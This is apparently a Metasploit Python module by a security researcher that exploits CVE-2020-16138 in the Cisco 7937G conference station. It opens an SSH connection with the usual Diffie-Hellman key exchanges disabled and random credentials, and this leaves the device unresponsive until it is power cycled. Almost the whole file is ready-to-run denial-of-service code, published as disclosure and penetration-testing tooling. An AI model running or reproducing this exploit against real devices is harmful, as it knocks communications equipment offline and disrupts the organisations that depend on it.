#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# standard modules
from metasploit import module
import logging
import string
import random

# extra modules
dependency1_missing = False
dependency2_missing = False
try:
    import socket
except ImportError:
    dependency1_missing = True
try:
    import paramiko
except ImportError:
    dependency2_missing = True


metadata = {
    'name': 'Cisco 7937G Denial-of-Service Attack',
    'description': '''
        This module exploits a bug in how the conference station 
	handles incoming SSH connections that provide an incompatible 
	key exchange. By connecting with an incompatible key exchange, 
	the device becomes nonresponsive until it is manually power
	cycled.
    ''',
    'authors': [
        'Cody Martin'
	# Author Homepage: debifrank.github.io
	# Organization: BlackLanternSecurity
	# Org. Homepage: BlackLanternSecurity.com
    ],
    'date': '2020-06-02',
    'license': 'GPL_LICENSE',
    'references': [
        {'type': 'url', 'ref': 'https://blacklanternsecurity.com/2020-08-07-Cisco-Unified-IP-Conference-Station-7937G/'},
        {'type': 'cve', 'ref': '2020-16138'}
    ],
    'type': 'dos',
    'options': {
        'rhost': {'type': 'address', 
		'description': 'Target address', 
		'required': True, 
		'default': 'None'},
        'timeout': {'type': 'int', 
		'description': 
		'Timeout in seconds', 
		'required': True, 
		'default': 15}
    }
}

# from modules/auxiliary/dos/http/slowloris.py
def create_rand_cred(size, seq=string.ascii_uppercase + string.ascii_lowercase):
    return ''.join(random.choice(seq) for _ in range(size))

def run(args):
    module.LogHandler.setup(msg_prefix='{} - '.format(args['rhost']))
    if dependency1_missing:
        logging.error('Python module dependency (socket) is missing, cannot continue')
        logging.error('Please execute pip3 install socket.')
        return
    if dependency2_missing:
        logging.error('Python module dependency (paramiko) is missing, cannot continue')
        logging.error('Please execute pip3 install paramiko.')
        return

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(int(args['timeout']))
    try:
        sock.connect((args['rhost'], 22))
    except OSError:
        logging.error("Device doesn't appear to be functioning (already DoS'd?) or SSH is not enabled.")
        return

    transport = paramiko.Transport(sock=sock, disabled_algorithms={"kex": ["diffie-hellman-group-exchange-sha1",
                                                                           "diffie-hellman-group14-sha1",
                                                                           "diffie-hellman-group1-sha1"]})
    ssh_uname = create_rand_cred(random.randint(7, 10))
    ssh_pass = create_rand_cred(random.randint(7, 10))
    try:
        transport.connect(username=ssh_uname, password=ssh_pass)
    except (paramiko.ssh_exception.SSHException, OSError, paramiko.SSHException):
        logging.info("DoS non-reset attack completed!")
        logging.info("Errors are intended.")
        logging.info("Device must be power cycled to restore functionality.")
        return

    return


if __name__ == '__main__':
    module.run(metadata, run)
